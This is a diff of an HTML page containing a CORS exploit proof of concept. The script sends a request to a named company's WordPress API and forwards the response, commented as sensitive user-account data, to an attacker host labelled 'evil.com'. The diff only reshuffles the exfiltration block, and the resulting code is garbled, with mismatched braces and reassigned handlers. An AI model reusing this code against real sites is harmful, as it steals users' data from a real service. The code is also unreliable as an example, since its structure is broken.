@@ -37,15 +37,7 @@
     <script>
     function cors(){
         var xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function(){
-            if(this.readyState == 4 && this.status == 200) {
-                var a = this.responseText ; // Sensitive data from user account
-                document.getElementById("demo").innerHTML =a;
-                xhttp.open("POST","https://salamoxso.github.io/evil.com/",true);// Sending that data to Attacker's website
-                console.log(a);
-                xhttp.send("data ="+a);
-            }
-            xhttp.onreadystatechange = function() {
+          xhttp.onreadystatechange = function() {
         if (this.readyState == 4) {
             if (this.status == 200) {
                 var responseData = this.responseText;
@@ -62,6 +54,15 @@
     xhttp.open("POST", "https://backend.blog.nubank.com.br/wp-json/", true);
     xhttp.setRequestHeader("Content-type", "application/json"); // Set appropriate headers if needed
     xhttp.send();
+        xhttp.onreadystatechange = function(){
+            if(this.readyState == 4 && this.status == 200) {
+                var a = this.responseText ; // Sensitive data from user account
+                document.getElementById("demo").innerHTML =a;
+                xhttp.open("POST","https://salamoxso.github.io/evil.com/",true);// Sending that data to Attacker's website
+                console.log(a);
+                xhttp.send("data ="+a);
+            }
+          
 }
         };
         xhttp.open("POST","https://backend.blog.nubank.com.br/wp-json/",true);
